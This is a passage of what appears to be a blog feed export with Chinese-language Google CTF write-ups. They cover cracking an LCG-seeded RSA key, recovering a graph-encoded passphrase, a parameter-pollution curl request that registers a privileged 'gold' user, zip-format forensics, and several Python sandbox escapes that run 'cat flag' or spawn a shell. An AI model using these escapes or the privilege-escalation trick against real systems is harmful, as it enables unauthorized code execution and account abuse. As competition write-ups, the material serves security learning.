self.lcg_n return self.state m, a, c = crack_unknown_modulus(output_values) seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635 lcg = LCG(a, c, m, seed) print(a, c, m) primes_n = 1 primes_arr = [] for i in range(8): while True: prime_candidate = lcg.next() if not isPrime(prime_candidate): continue elif prime_candidate.bit_length() != 512: continue else: primes_n *= prime_candidate primes_arr.append(prime_candidate) break print(list(primes_arr)) phi = 1 for k in primes_arr: phi *= k - 1 key = RSA.importKey(open(&quot;public.pem&quot;, &quot;r&quot;).read()) n = key.n e = key.e d = gmpy2.invert(e, phi) enc = open(&quot;flag.txt&quot;, &quot;rb&quot;).read() flag = pow(int.from_bytes(enc, &quot;little&quot;), d, n) print(long_to_bytes(flag)) flag: CTF&#123;C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy&#125; 参考: 攻击线性同余生成器(LCG) | 码农网 LCG(线性同余生成器)_lcg线性同余_WustHandy的博客-CSDN博客 NPCA friend handed me this map and told me that it will lead me to the flag.It is confusing me and I don’t know how to read it, can you help me out? Attachment 使用Graphviz工具将hint.dot转换为图片,得到下图 dot -Tjpg hint.dot -o hint.jpg 分析代码: 从USACONST.TXT中随机选择N个单词生成密码,使用passphrase.encrypt(secret, password)对flag加密 对于password中的每个字母,创建一个带有唯一ID的节点,并添加到图中 按照password的顺序,对密码中相邻的两个字符创建一条边 向图中随机添加int(len(password) ** 1.3)条边 随机打乱图中节点和边的顺序 随机交换一些节点的起点和终点,由于random() % 2只有在random函数返回值为0时才为False,我们假定图中每条边的起点和终点都被交换了一遍 将节点和边的信息写入到hint.dot文件中 我是思路是: 遍历words_list中的单词,从每个节点出发,使用DFS判断是否可以在图中找到,这样过滤后得到30个单词,即密码一定由该30个单词中的某几个单词组成 枚举密码中所用的单词个数N 使用组合数从这30个单词选择N个单词 判断所选的N个单词组成的字符集和hint.dot中的字符集是否一致 对N个单词进行全排列,并尝试解密 (为了提高效率,这里还用到了多进程) 当N&#x3D;5时,得到passwordstandardwatersigngivenchosen和flag. 代码 import concurrent.futures import itertools import re from collections import Counter from pyrage import passphrase from encrypt import get_word_list class Node: def __init__(self, letter): self.letter = letter self.adjacent = [] def __str__(self) -&gt; str: return f&quot;&#123;self.letter&#125; -&gt; &#123;[x.letter for x in self.adjacent]&#125;&quot; __repr__ = __str__ def build_nodes(): pattern = r&quot;\\s+(\\d+)\\s+\\[label=(\\w+)\\];&quot; pattern2 = r&quot;\\s+(\\d+)\\s+--\\s+(\\d+);$&quot; nodes = dict() with open(&quot;hint.dot&quot;, &quot;r&quot;) as f: for line in f: if &quot;label&quot; in line match = re.match(pattern, line) node_id = match.group(1) letter = match.group(2) nodes[node_id] = Node(letter) elif &quot;--&quot; in line: match = re.match(pattern2, line) start = match.group(1) end = match.group(2) # nodes[start].adjacent.append(nodes[end]) nodes[end].adjacent.append(nodes[start]) return nodes visited = set() def dfs(node, index, word): if index == len(word): return True if node.letter != word[index]: return False visited.add(node) for adj in node.adjacent: if adj not in visited: if dfs(adj, index + 1, word): return True visited.remove(node) return False def check(password): with open(&quot;secret.age&quot;, &quot;rb&quot;) as f: enc = f.read() try: print(&quot;[FLAG] is &quot;, passphrase.decrypt(enc, password)) print(&quot;Password is &quot;, password) except Exception as e: pass def filter_words(nodes): ans = set() for word in get_word_list(): visited.clear() for node in nodes.values(): if dfs(node, 0, word): ans.add(word) break print(&quot;ans:&quot;, len(ans), ans) return ans def main(): nodes = build_nodes() letters = sorted([node.letter for node in nodes.values()]) ans = filter_words(nodes) for num in range(1, len(ans) + 1): print(f&quot;Num is &#123;num&#125;&quot;) for comb in itertools.combinations(ans, num): # 组合 if sorted(&quot;&quot;.join(comb)) == letters: passwords = [ &quot;&quot;.join(perm) for perm in itertools.permutations(comb, len(comb)) ] with concurrent.futures.ProcessPoolExecutor(max_workers=8) as executor: executor.map(check, passwords) if __name__ == &quot;__main__&quot;: main() flag: CTF&#123;S3vEn_bR1dg35_0f_K0eN1g5BeRg&#125; 参考: concurrent.futures — 启动并行任务 – Python 3.11.4 文档 UNDER-CONSTRUCTIONWe were building a web app but the new CEO wants it remade in php. Attachmenthttps://under-construction-web.2023.ctfcompetition.comhttps://under-construction-php-web.2023.ctfcompetition.com 题目提供了Flask和PHP两个站点,用户可以在Flask站点进行注册,注册的账号可以同时用于登录Flask和PHP两个站点. 分析代码: Flask会将HTTP请求原始查询参数转发到PHP应用程序中完成用户注册. # File: /flask/authorized_routes.py @authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;]) def signup_post(): raw_request = request.get_data() ... requests.post(f&quot;http://&#123;PHP_HOST&#125;:1337/account_migrator.php&quot;, headers=&#123;&quot;token&quot;: TOKEN, &quot;content-type&quot;: request.headers.get(&quot;content-type&quot;)&#125;, data=raw_request) return redirect(url_for(&#39;authorized.login&#39;)) 只有gold级别的用户,在PHP站点登录后才可以看到FLAG # File: /php/index.php function getResponse() &#123; ... $response = &quot;Login successful. Welcome &quot; . htmlspecialchars($username) . &quot;.&quot;; if ($tier === &quot;gold&quot;) &#123; $response .= &quot; &quot; . getenv(&quot;FLAG&quot;); &#125; return $response; &#125; Flask会对查询参数进行校验,防止创建高权限的用户. # File: /flask/authorized_routes.py @authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;]) def signup_post(): ... tier = models.Tier(request.form.get(&#39;tier&#39;)) if(tier == models.Tier.GOLD): flash(&#39;GOLD tier only allowed for the CEO&#39;) return redirect(url_for(&#39;authorized.signup&#39;)) ... HTTP查询参数中存在重复的key时,在Flask和PHP有不同的行为,flask会取第一个值,而PHP会取最后一个值. 因此我们可以构造如下命令,以此绕过Flask对查询参数的校验,并在PHP中注册高权限用户. curl curl -X POST https://under-construction-web.2023.ctfcompetition.com/signup -d &quot;username=admin&amp;password=admin&amp;tier=blue&amp;tier=gold&quot; 然后用上述的用户名和密码去PHP站点登录即可. flag: CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;","date_published":"2023-06-29T17:35:41.000Z","tags":["CTF","CTF","GoogleCTF"]},{"id":"https://zhaoqi.vip/posts/632988450/","url":"https://zhaoqi.vip/posts/632988450/","title":"GoogleCTF2022 Writeup","content_html":"<h1 id=\"APPNOTE-TXT\"><a href=\"#APPNOTE-TXT\" class=\"headerlink\" title=\"APPNOTE.TXT\"></a>APPNOTE.TXT</h1><p><em>Every single archive manager unpacks this to a different file…</em></p>\n<p><em><a href=\"https://storage.googleapis.com/gctf-2022-attachments-project/2551253642bde3066e55c9cc8e9b0b4aa77feadc00c81032da778e6f7c89907135dfc2611fd8617204720dbfadb31429ae11f6ecd202887f4ce99f2f53a3c5e8\">Attachment</a></em></p>\n<hr>\n<p>解压下载得到的文件<code>dump.zip</code>,得到<code>hello.txt</code>: <code>There&#39;s more to it than meets the eye...</code></p>\n<p>猜测可能有隐藏文件,用<code>binwalk</code>分析:</p>\n<ul>\n<li>文件名从<code>flag00.zip</code>到<code>flag18.zip</code></li>\n<li>每个文件名出现36次</li>\n</ul>\n<pre><code class=\"bash\">~$ binwalk dump.zip\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             Zip archive data, v0.0 compressed size: 41, uncompressed size: 41, name: hello.txt\n135           0x87            Zip archive data, v0.0 compressed size: 33, uncompressed size: 33, name: hi.txt\n256           0x100           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00\n345           0x159           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00\n434           0x1B2           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00\n523           0x20B           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00\n612           0x264           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00\n...\n60598         0xECB6          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18\n60687         0xED0F          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18\n60776         0xED68          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18\n60865         0xEDC1          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18\n60954         0xEE1A          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18\n61043         0xEE73          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18\n61572         0xF084          End of Zip archive, footer length: 22\n</code></pre>\n<p>使用<code>strings</code>和<code>hexdump</code>分析,发现:</p>\n<ul>\n<li>包含文件<code>hi.txt</code>: <code>Find a needle in the haystack...</code></li>\n<li>猜测flag的长度为18,每组<code>flagXX</code>表示了flag中的一个字符</li>\n<li>dump出来任意一组<code>flagXX</code>,得到flag的字母表<code>abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_</code></li>\n<li>已知flag格式为<code>CTF&#123;...&#125;</code></li>\n</ul>\n<pre><code class=\"bash\">~$ strings dump.zip\nV~uK)\nhello.txtThere&#39;s more to it than meets the eye...\nV~uK)\nhello.txtPK\nhi.txtFind a needle in the haystack...\nhi.txtPK\nflag00aPK\nflag00PK\nflag00bPK\nflag00PK\nflag00cPK\nflag00PK\nflag00dPK\nflag00PK\nflag00ePK\n......\nflag18PK\nflag181PK\nflag18PK\nflag183PK\nflag18PK\nflag187PK\nflag18PK\nflag18&#125;PK\nflag18PK\nflag18_PK\nflag18PK\n</code></pre>\n<pre><code class=\"bash\">~$ hexdump -C dump.zip | head -n 30\n00000000  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 56 7e  |PK............V~|\n00000010  75 4b 29 00 00 00 29 00  00 00 09 00 00 00 68 65  |uK)...).......he|\n00000020  6c 6c 6f 2e 74 78 74 54  68 65 72 65 27 73 20 6d  |llo.txtThere&#39;s m|\n00000030  6f 72 65 20 74 6f 20 69  74 20 74 68 61 6e 20 6d  |ore to it than m|\n00000040  65 65 74 73 20 74 68 65  20 65 79 65 2e 2e 2e 0a  |eets the eye....|\n00000050  50 4b 01 02 00 00 00 00  00 00 00 00 00 00 00 00  |PK..............|\n00000060  56 7e 75 4b 29 00 00 00  29 00 00 00 09 00 00 00  |V~uK)...).......|\n00000070  fd ef 00 00 00 00 00 00  00 00 00 00 00 00 68 65  |..............he|\n00000080  6c 6c 6f 2e 74 78 74 50  4b 03 04 00 00 00 00 00  |llo.txtPK.......|\n00000090  00 00 00 00 00 9a 15 62  e9 21 00 00 00 21 00 00  |.......b.!...!..|\n000000a0  00 06 00 00 00 68 69 2e  74 78 74 46 69 6e 64 20  |.....hi.txtFind |\n000000b0  61 20 6e 65 65 64 6c 65  20 69 6e 20 74 68 65 20  |a needle in the |\n000000c0  68 61 79 73 74 61 63 6b  2e 2e 2e 0a 50 4b 01 02  |haystack....PK..|\n000000d0  00 00 00 00 00 00 00 00  00 00 00 00 9a 15 62 e9  |..............b.|\n000000e0  21 00 00 00 21 00 00 00  06 00 00 00 84 ef 00 00  |!...!...........|\n000000f0  00 00 00 00 00 00 87 00  00 00 68 69 2e 74 78 74  |..........hi.txt|\n00000100  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 43 be  |PK............C.|\n00000110  b7 e8 01 00 00 00 01 00  00 00 06 00 00 00 66 6c  |..............fl|\n00000120  61 67 30 30 61 50 4b 01  02 00 00 00 00 00 00 00  |ag00aPK.........|\n00000130  00 00 00 00 00 43 be b7  e8 01 00 00 00 01 00 00  |.....C..........|\n00000140  00 06 00 00 00 2b ef 00  00 00 00 00 00 00 00 00  |.....+..........|\n00000150  01 00 00 66 6c 61 67 30  30 50 4b 03 04 00 00 00  |...flag00PK.....|\n00000160  00 00 00 00 00 00 00 f9  ef be 71 01 00 00 00 01  |..........q.....|\n00000170  00 00 00 06 00 00 00 66  6c 61 67 30 30 62 50 4b  |.......flag00bPK|\n00000180  01 02 00 00 00 00 00 00  00 00 00 00 00 00 f9 ef  |................|\n00000190  be 71 01 00 00 00 01 00  00 00 06 00 00 00 d2 ee  |.q..............|\n000001a0  00 00 00 00 00 00 00 00  59 01 00 00 66 6c 61 67  |........Y...flag|\n000001b0  30 30 50 4b 03 04 00 00  00 00 00 00 00 00 00 00  |00PK............|\n000001c0  6f df b9 06 01 00 00 00  01 00 00 00 06 00 00 00  |o...............|\n000001d0  66 6c 61 67 30 30 63 50  4b 01 02 00 00 00 00 00  |flag00cPK.......|\n</code></pre>\n<p>参照ZIP文件格式,按照<code>504B0304</code>、<code>504B0102</code>、<code>504B0506</code>分隔<code>dump.zip</code>的<a href=\"assets/../../CTF/GoogleCTF2022/Misc/hex.out\">十六进制表示形式</a>,分析发现:</p>\n<ul>\n<li><code>hello.txt</code>和<code>hi.txt</code>一共占用256字节</li>\n<li><code>flagXX</code>的文件实体为37字节、目录源数据为52字节</li>\n<li>每组<code>flagXX</code>共占用(37 + 53) * 36字节</li>\n</ul>\n<p><img data-src=\"/../../CTF/GoogleCTF2022/Misc/images/B04B0506.png\" alt=\"B04B0506\"></p>\n<p>发现结尾多了18个目录数据源结束标识,猜测可能以此还原文件,以<code>flag00</code>为例:</p>\n<p>目录源数据的开始位置偏移为<code>0x880A0000</code>,用小端表示为<code>0x00000A88</code>(2696),减去<code>hello.txt</code>和<code>hi.txt</code>的256字节,减去第一个文件实体的37字节,然后除以(37+52)得到27,指向<code>flag00</code>这一组的第27个文件实体(从0开始),即字符C.基于flag的格式以C开头,大胆猜测这就是正确答案.</p>\n<p>剩下的过程与之类似,可以使用脚本简化:</p>\n<pre><code class=\"python\">data = &quot;&quot;&quot;\\\n880A0000\n65170000\n42240000\nBB2F0000\n6C380000\n274A0000\n7F520000\n3A640000\n71690000\n377C0000\n587F0000\nF1950000\n3E9D0000\n5EA80000\n88BC0000\n92C50000\n2CD40000\n20DB0000\n3FEE0000\n&quot;&quot;&quot;.split()\nprint(len(data))\n\nCHOICES = &#39;abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_&#39;\nans = list()\n\ndef conv(s):\n      # 大端转小端\n    a = [s[2 * i:2 * (i + 1)] for i in range(len(s) // 2)]\n    a.reverse()\n    return &#39;&#39;.join(a)\n\nfor i,item in enumerate(data):\n    t = int(conv(item), 16) - 256 - 37\n    tt = t // (37 + 52)\n    ttt = tt - 36 * i\n    ans.append(CHOICES[ttt])\n    print(&#39;&#39;.join(ans))\n</code></pre>\n<p>flag:<code>CTF&#123;p0s7m0d3rn_z1p&#125;</code></p>\n<p>参考</p>\n<ul>\n<li><a href=\"https://xz.aliyun.com/t/3994\">从做CTF题到手撕ZIP</a></li>\n<li><a href=\"http://lordaeronesz.top/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/\">ZIP格式分析</a></li>\n<li><a href=\"https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT\">.ZIP File Format Specification</a></li>\n</ul>\n<h1 id=\"TREEBOX\"><a href=\"#TREEBOX\" class=\"headerlink\" title=\"TREEBOX\"></a>TREEBOX</h1><p><em>I think I finally got Python sandboxing right.</em></p>\n<p><em><a href=\"https://storage.googleapis.com/gctf-2022-attachments-project/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301\">Attachment</a> <code>treebox.2022.ctfcompetition.com 1337</code></em></p>\n<hr>\n<details>\n<summary style=\"display: list-item;\">treebox.py</summary>\n\n<div markdown=\"1\">\n\n<pre><code class=\"python\">#!/usr/bin/python3 -u\n#\n# Flag is in a file called &quot;flag&quot; in cwd.\n#\n# Quote from Dockerfile:\n#   FROM ubuntu:22.04\n#   RUN apt-get update &amp;&amp; apt-get install -y python3\n#\nimport ast\nimport sys\nimport os\n\ndef verify_secure(m):\n  for x in ast.walk(m):\n    match type(x):\n      case (ast.Import|ast.ImportFrom|ast.Call):\n        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)\n        return False\n  return True\n\nabspath = os.path.abspath(__file__)\ndname = os.path.dirname(abspath)\nos.chdir(dname)\n\nprint(&quot;-- Please enter code (last line must contain only --END)&quot;)\nsource_code = &quot;&quot;\nwhile True:\n  line = sys.stdin.readline()\n  if line.startswith(&quot;--END&quot;):\n    break\n  source_code += line\n\ntree = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;, flags=ast.PyCF_ONLY_AST)\nif verify_secure(tree):  # Safe to execute!\n  print(&quot;-- Executing safe code:&quot;)\n  compiled = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;)\n  exec(compiled)\n</code></pre>\n</div>\n</details>\n\n<p>阅读源码,可以发现:</p>\n<ul>\n<li><code>flag</code>在当前工作目录下一个名为<code>flag</code>的文件</li>\n<li>我们可以通过<code>exec</code>执行任意代码,但必须通过<code>verify_secure</code>函数的检查</li>\n<li><code>verify_secure</code>使用<code>ast</code>模块进行分析,不能有显式的函数调用和导入语句</li>\n<li><code>os</code>和<code>sys</code>模块可用</li>\n</ul>\n<p>思路:</p>\n<ul>\n<li><code>os</code>模块已经导入,我们可以通过<code>os.system()</code>方法来执行系统命令</li>\n<li>借助于Python机制,通过非显式的方式地来调用函数,如内置函数、重载运算符、解释器Hook</li>\n</ul>\n<p>我的解法:</p>\n<p>在python中使用<code>in</code>运算符时,默认会调用<code>__contains__</code>方法,并且会将需要判断的对象作为形参传入;</p>\n<p>所以我们可以用<code>os.system</code>覆盖现有的python对象&#x2F;类上的<code>__contains__</code>方法,然后通过运算符来调用<code>system</code>函数.</p>\n<pre><code class=\"python\">os.environ.__class__.__contains__ = os.system\n&#39;cat flag&#39; in os.environ\n</code></pre>\n<p>其他解法:</p>\n<ol>\n<li><p>装饰器</p>\n<pre><code class=\"python\">@exec\n@input\nclass X:\n  pass\n</code></pre>\n</li>\n<li><p>异常</p>\n<pre><code class=\"python\">class MyException(Exception):\n  def __str__(self):\n    return &#39;cat flag&#39;\n\nsys.stdout.write=os.system\nsys.stderr.write=os.system\n\nraise MyException   \n</code></pre>\n<pre><code class=\"python\">class X:\n    def __init__(self, a, b, c):\n        self += &quot;os.system(&#39;sh&#39;)&quot;\n    __iadd__ = exec\nsys.excepthook = X\n1/0\n</code></pre>\n</li>\n<li><p>元类</p>\n<pre><code class=\"python\"># This will define the members on the &quot;sub&quot;class\nclass Metaclass:\n    __getitem__ = exec # So Sub[string] will execute exec(string)\n# Note: Metaclass.__class__ == type\n    \nclass Sub(metaclass=Metaclass): # That&#39;s how we make Sub.__class__ == Metaclass\n    pass # Nothing special to do\n\nassert isinstance(Sub, Metaclass)\nsub[&#39;import os; os.system(&quot;sh&quot;)&#39;]\n</code></pre>\n</li>\n</ol>\n<p>其他Writeup</p>\n<ul>\n<li><a href=\"https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/\">GCTF 2022 Treebox</a></li>\n</ul>\n<p><strong>flag:</strong><code>CTF&#123;CzeresniaTopolaForsycja&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"APPNOTE.TXTEvery single archive manager unpacks this to a different file… Attachment 解压下载得到的文件dump.zip,得到hello.txt: There&#39;s more to it than meets the eye... 猜测可能有隐藏文件,用binwalk分析: 文件名从flag00.zip到flag18.zip 每个文件名出现36次 ~$ binwalk dump.zip DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Zip archive data, v0.0 compressed size: 41, uncompressed size: 41, name: hello.txt 135 0x87 Zip archive data, v0.0 compressed size: 33, uncompressed size: 33, name: hi.txt 256 0x100 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 345 0x159 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 434 0x1B2 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 523 0x20B Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 612 0x264 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 ... 60598 0xECB6 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 60687 0xED0F Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 60776 0xED68 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 60865 0xEDC1 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 60954 0xEE1A Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 61043 0xEE73 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 61572 0xF084 End of Zip archive, footer length: 22 使用strings和hexdump分析,发现: 包含文件hi.txt: Find a needle in the haystack... 猜测flag的长度为18,每组flagXX表示了flag中的一个字符 dump出来任意一组flagXX,得到flag的字母表abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_ 已知flag格式为CTF&#123;...&#125; ~$ strings dump.zip V~uK) hello.txtThere&#39;s more to it than meets the eye... V~uK) hello.txtPK hi.txtFind a needle in the haystack... hi.txtPK flag00aPK flag00PK flag00bPK flag00PK flag00cPK flag00PK flag00dPK flag00PK flag00ePK ...... flag18PK flag181PK flag18PK flag183PK flag18PK flag187PK flag18PK flag18&#125;PK flag18PK flag18_PK flag18PK ~$ hexdump -C dump.zip | head -n 30 00000000 50 4b 03 04 00 00 00 00 00 00 00 00 00 00 56 7e |PK............V~| 00000010 75 4b 29 00 00 00 29 00 00 00 09 00 00 00 68 65 |uK)...).......he| 00000020 6c 6c 6f 2e 74 78 74 54 68 65 72 65 27 73 20 6d |llo.txtThere&#39;s m| 00000030 6f 72 65 20 74 6f 20 69 74 20 74 68 61 6e 20 6d |ore to it than m| 00000040 65 65 74 73 20 74 68 65 20 65 79 65 2e 2e 2e 0a |eets the eye....| 00000050 50 4b 01 02 00 00 00 00 00 00 00 00 00 00 00 00 |PK..............| 00000060 56 7e 75 4b 29 00 00 00 29 00 00 00 09 00 00 00 |V~uK)...).......| 00000070 fd ef 00 00 00 00 00 00 00 00 00 00 00 00 68 65 |..............he| 00000080 6c 6c 6f 2e 74 78 74 50 4b 03 04 00 00 00 00 00 |llo.txtPK.......| 00000090 00 00 00 00 00 9a 15 62 e9 21 00 00 00 21 00 00 |.......b.!...!..| 000000a0 00 06 00 00 00 68 69 2e 74 78 74 46 69 6e 64 20 |.....hi.txtFind | 000000b0 61 20 6e 65 65 64 6c 65 20 69 6e 20 74 68 65 20 |a needle in the | 000000c0 68 61 79 73 74 61 63 6b 2e 2e 2e 0a 50 4b 01 02 |haystack....PK..| 000000d0 00 00 00 00 00 00 00 00 00 00 00 00 9a 15 62 e9 |..............b.| 000000e0 21 00 00 00 21 00 00 00 06 00 00 00 84 ef 00 00 |!...!...........| 000000f0 00 00 00 00 00 00 87 00 00 00 68 69 2e 74 78 74 |..........hi.txt| 00000100 50 4b 03 04 00 00 00 00 00 00 00 00 00 00 43 be |PK............C.| 00000110 b7 e8 01 00 00 00 01 00 00 00 06 00 00 00 66 6c |..............fl| 00000120 61 67 30 30 61 50 4b 01 02 00 00 00 00 00 00 00 |ag00aPK.........| 00000130 00 00 00 00 00 43 be b7 e8 01 00 00 00 01 00 00 |.....C..........| 00000140 00 06 00 00 00 2b ef 00 00 00 00 00 00 00 00 00 |.....+..........| 00000150 01 00 00 66 6c 61 67 30 30 50 4b 03 04 00 00 00 |...flag00PK.....| 00000160 00 00 00 00 00 00 00 f9 ef be 71 01 00 00 00 01 |..........q.....| 00000170 00 00 00 06 00 00 00 66 6c 61 67 30 30 62 50 4b |.......flag00bPK| 00000180 01 02 00 00 00 00 00 00 00 00 00 00 00 00 f9 ef |................| 00000190 be 71 01 00 00 00 01 00 00 00 06 00 00 00 d2 ee |.q..............| 000001a0 00 00 00 00 00 00 00 00 59 01 00 00 66 6c 61 67 |........Y...flag| 000001b0 30 30 50 4b 03 04 00 00 00 00 00 00 00 00 00 00 |00PK............| 000001c0 6f df b9 06 01 00 00 00 01 00 00 00 06 00 00 00 |o...............| 000001d0 66 6c 61 67 30 30 63 50 4b 01 02 00 00 00 00 00 |flag00cPK.......| 参照ZIP文件格式,按照504B0304、504B0102、504B0506分隔dump.zip的十六进制表示形式,分析发现: hello.txt和hi.txt一共占用256字节 flagXX的文件实体为37字节、目录源数据为52字节 每组flagXX共占用(37 + 53) * 36字节 发现结尾多了18个目录数据源结束标识,猜测可能以此还原文件,以flag00为例: 目录源数据的开始位置偏移为0x880A0000,用小端表示为0x00000A88(2696),减去hello.txt和hi.txt的256字节,减去第一个文件实体的37字节,然后除以(37+52)得到27,指向flag00这一组的第27个文件实体(从0开始),即字符C.基于flag的格式以C开头,大胆猜测这就是正确答案. 剩下的过程与之类似,可以使用脚本简化: data = &quot;&quot;&quot;\\ 880A0000 65170000 42240000 BB2F0000 6C380000 274A0000 7F520000 3A640000 71690000 377C0000 587F0000 F1950000 3E9D0000 5EA80000 88BC0000 92C50000 2CD40000 20DB0000 3FEE0000 &quot;&quot;&quot;.split() print(len(data)) CHOICES = &#39;abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_&#39; ans = list() def conv(s): # 大端转小端 a = [s[2 * i:2 * (i + 1)] for i in range(len(s) // 2)] a.reverse() return &#39;&#39;.join(a) for i,item in enumerate(data): t = int(conv(item), 16) - 256 - 37 tt = t // (37 + 52) ttt = tt - 36 * i ans.append(CHOICES[ttt]) print(&#39;&#39;.join(ans)) flag:CTF&#123;p0s7m0d3rn_z1p&#125; 参考 从做CTF题到手撕ZIP ZIP格式分析 .ZIP File Format Specification TREEBOXI think I finally got Python sandboxing right. Attachment treebox.2022.ctfcompetition.com 1337 treebox.py #!/usr/bin/python3 -u # # Flag is in a file called &quot;flag&quot; in cwd. # # Quote from Dockerfile: # FROM ubuntu:22.04 # RUN apt-get update &amp;&amp; apt-get install -y python3 # import ast import sys import os def verify_secure(m): for x in ast.walk(m): match type(x): case (ast.Import|ast.ImportFrom|ast.Call): print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;) return False return True abspath = os.path.abspath(__file__) dname = os.path.dirname(abspath) os.chdir(dname) print(&quot;-- Please enter code (last line must contain only --END)&quot;) source_code = &quot;&quot; while True: line = sys.stdin.readline() if line.startswith(&quot;--END&quot;): break source_code += line tree = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;, flags=ast.PyCF_ONLY_AST) if verify_secure(tree): # Safe to execute! print(&quot;-- Executing safe code:&quot;) compiled = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;) exec(compiled) 阅读源码,可以发现: flag在当前工作目录下一个名为flag的文件 我们可以通过exec执行任意代码,但必须通过verify_secure函数的检查 verify_secure使用ast模块进行分析,不能有显式的函数调用和导入语句 os和sys模块可用 思路: os模块已经导入,我们可以通过os.system()方法来执行系统命令 借助于Python机制,通过非显式的方式地来调用函数,如内置函数、重载运算符、解释器Hook 我的解法: 在python中使用in运算符时,默认会调用__contains__方法,并且会将需要判断的对象作为形参传入; 所以我们可以用os.system覆盖现有的python对象&#x2F;类上的__contains__方法,然后通过运算符来调用system函数. os.environ.__class__.__contains__ = os.system &#39;cat flag&#39; in os.environ 其他解法: 装饰器 @exec @input class X: pass 异常 class MyException(Exception): def __str__(self): return &#39;cat flag&#39; sys.stdout.write=os.system sys.stderr.write=os.system raise MyException class X: def __init__(self, a, b, c): self += &quot;os.system(&#39;sh&#39;)&quot; __iadd__ = exec sys.excepthook = X 1/0 元类 # This will define the members on the &quot;sub&quot;class class Metaclass: __getitem__ = exec # So Sub[string] will execute exec(string) # Note: Metaclass.__class__ == type class Sub(metaclass=Metaclass): # That&#39;s how we make Sub.__class__ == Metaclass pass # Nothing special to do assert isinstance(Sub, Metaclass) sub[&#39;import os; os.system(&quot;sh&quot;)&#39;] 其他Writeup GCTF 2022 Treebox flag:CTF&#123;CzeresniaTopolaForsycja&#125;","summary":"APPNOTE.TXTEvery single archive manager unpacks this to a different file… Attachment 解压下载得到的文件dump.zip,得到hello.txt: There&#39;s more to it than meets the eye... 猜测可能有隐藏文件,用binwalk分析: 文件名从flag00.zip到flag18.zip 每个文件名出现36次 ~$ binwalk dump.zip DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Zip archive data, v0.0 compressed size: 41, uncompressed size: 41, name: hello.txt 135 0x87 Zip archive data, v0.0 compressed size: 33, uncompressed size: 33, name: hi.txt 256 0x100 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 345 0x159 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 434 0x1B2 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 523 0x20B Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 612 0x264 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00 ... 60598 0xECB6 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 60687 0xED0F Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 60776 0xED68 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 60865 0xEDC1 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 60954 0xEE1A Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 61043 0xEE73 Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18 61572 0xF084 End of Zip archive, footer length: 22 使用strings和hexdump分析,发现: 包含文件hi.txt: Find a needle in the haystack... 猜测flag的长度为18,每组flagXX表示了flag中的一个字符 dump出来任意一组flagXX,得到flag的字母表abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_ 已知flag格式为CTF&#123;...&#125; ~$ strings dump.zip V~uK) hello.txtThere&#39;s more to it than meets the eye... V~uK) hello.txtPK hi.txtFind 